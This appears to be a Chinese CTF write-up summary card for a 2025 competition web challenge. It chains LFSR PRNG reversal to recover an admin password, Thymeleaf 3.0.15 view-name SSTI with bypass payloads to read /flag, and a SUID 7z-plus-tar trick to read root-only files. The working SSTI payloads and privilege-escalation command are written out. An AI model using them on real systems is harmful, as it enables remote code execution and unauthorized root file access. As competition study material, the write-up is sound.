---
title: "软件系统安全赛-Thymeleaf 3.0.15 视图名注入 + PRNG 逆向:完整 RCE 到 Root 提权"
category: web
tags: ["软件系统安全赛", "web", "Thymeleaf-SSTI", "view-name-injection", "LFSR-reverse", "PRNG-prediction"]
signals: ["软件系统安全赛 2025", "Thymeleaf-SSTI", "view-name-injection", "LFSR-reverse", "PRNG-prediction", "SpEL", "ProcessBuilder", "SUID-7z", "root-tar", "web_unknown", "Thymeleaf", "SSTI", "bit", "LFSR"]
difficulty: hard
source: "https://www.ctfiot.com/302146.html"
tools: ["Java", "Spring"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 软件系统安全赛-Thymeleaf 3.0.15 视图名注入 + PRNG 逆向:完整 RCE 到 Root 提权

> 赛事：软件系统安全赛 2025 | 方向：web | 难度：hard | 工具：Java、Spring

## 一句话总结

软件系统安全赛Thymeleaf 3.0.15视图名注入SSTI + 48-bit LFSR PRNG逆向破解admin密码 + 7z SUID提权读取root-only /flag,完整PRNG→Admin takeover→SSTI→RCE→SUID链。

## 攻击链

1. 弱PRNG:Java 48-bit LFSR `feedback=((state>>47)^(state>>46)^(state>>43)^(state>>42))&1; state=((state>>1)|(feedback<<47))&MASK
2. 注册用户获取16位数字密码(完整PRNG状态)
3. admin密码比注册用户早6步(seed→9次next→adminPwd#10→user1-5#11-15→registered#16)
4. 逆向6步:每步2候选,共2^6=64候选,正向验证筛
5. 用admin密码登录
6. Thymeleaf 3.0.15 SSTI: `return "admin :: " + section;` 视图名拼接
7. 绕:`__|$${'{SpEL}'}|__` 预处理表达式+literal substitution
8. payload:`__|$${'{#response.setHeader(''X-Poc'',''1'')?:''main''}'}|__
9. 绕3.0.15:`new.ClassName`(点代替空格)
10. 读/flag:`new.java.util.Scanner(new.java.io.File('/flag')).useDelimiter('\A').next()
11. 提权:/flag为-r-------- root,SUID /usr/bin/7z
12. /usr/bin/7z a -ttar -an -so /flag 2>/dev/null | /bin/tar -xOf -

## 关键 payload

```
LFSR逆向6步 + __|$${'{SpEL}'}|__ + 7z a -ttar
```

## 经验教训

48-bit LFSR PRNG可逆向(2^6=64候选);Thymeleaf视图名拼接+__|$${'{SpEL}'}|__是稳定SSTI向量;7z SUID+tar pipe是Linux读取root-only文件的稳定技巧;`new.ClassName`绕3.0.15的空格过滤。

## 标签

Thymeleaf-SSTI、view-name-injection、LFSR-reverse、PRNG-prediction、SpEL、ProcessBuilder、SUID-7z、root-tar、Spring-MVC、java-ssti

## 参考来源

- https://www.ctfiot.com/302146.html
- 原文件：软件系统安全赛-Thymeleaf_3.0.15_视图名注入_+_PRNG_逆向：完整_RCE_到_Root_提权.full.md
